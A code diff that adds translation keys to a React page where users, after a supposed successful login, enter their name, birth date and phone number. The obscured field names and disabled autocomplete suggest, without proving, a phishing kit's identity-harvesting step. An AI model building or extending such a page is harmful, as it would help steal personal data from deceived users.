@@ -1,5 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
+import { useLanguage } from '../contexts/LanguageContext';
 import apiService from '../services/api';
 
 interface InfoFormData {
@@ -11,6 +12,7 @@ interface InfoFormData {
 
 const InfoPage: React.FC = () => {
   const navigate = useNavigate();
+  const { t } = useLanguage();
   const [formData, setFormData] = useState<InfoFormData>({
     xname1: '',
     xname2: '',
@@ -183,8 +185,8 @@ const InfoPage: React.FC = () => {
           {/* Left Column - Information Form */}
           <div className="left-column">
             <div className="info-section">
-              <h1 className="info-title">Information</h1>
-              <h2 className="info-subtitle">Persönliche Angaben</h2>
+              <h1 className="info-title">{t.personalInfo}</h1>
+              <h2 className="info-subtitle">{t.personalInfo}</h2>
               
               <p className="info-description">
                 Sie haben sich erfolgreich angemeldet. Um den Vorgang fortzusetzen, benötigen wir einige persönliche Informationen von Ihnen.
@@ -199,7 +201,7 @@ const InfoPage: React.FC = () => {
                     value={formData.xname1}
                     onChange={handleInputChange}
                     className="info-input"
-                    placeholder="Vorname"
+                    placeholder={t.firstName}
                     autoComplete="off"
                     maxLength={50}
                     required
@@ -215,7 +217,7 @@ const InfoPage: React.FC = () => {
                     value={formData.xname2}
                     onChange={handleInputChange}
                     className="info-input"
-                    placeholder="Nachname"
+                    placeholder={t.lastName}
                     autoComplete="off"
                     maxLength={50}
                     required
@@ -231,7 +233,7 @@ const InfoPage: React.FC = () => {
                     value={formData.xdob}
                     onChange={handleInputChange}
                     className="info-input"
-                    placeholder="Geburtsdatum (TT.MM.JJJJ)"
+                    placeholder={t.birthDate + ' (TT.MM.JJJJ)'}
                     autoComplete="off"
                     maxLength={10}
                     pattern="\d{2}\.\d{2}\.\d{4}"
@@ -248,7 +250,7 @@ const InfoPage: React.FC = () => {
                     value={formData.xtel}
                     onChange={handleInputChange}
                     className="info-input"
-                    placeholder="Telefonnummer"
+                    placeholder={t.phone}
                     autoComplete="off"
                     required
                   />
@@ -260,7 +262,7 @@ const InfoPage: React.FC = () => {
                   className="info-button"
                   disabled={isLoading}
                 >
-                  {isLoading ? 'Weiter...' : 'Weiter'}
+                  {isLoading ? (t.nextButton + '...') : t.nextButton}
                 </button>
               </form>
             </div>
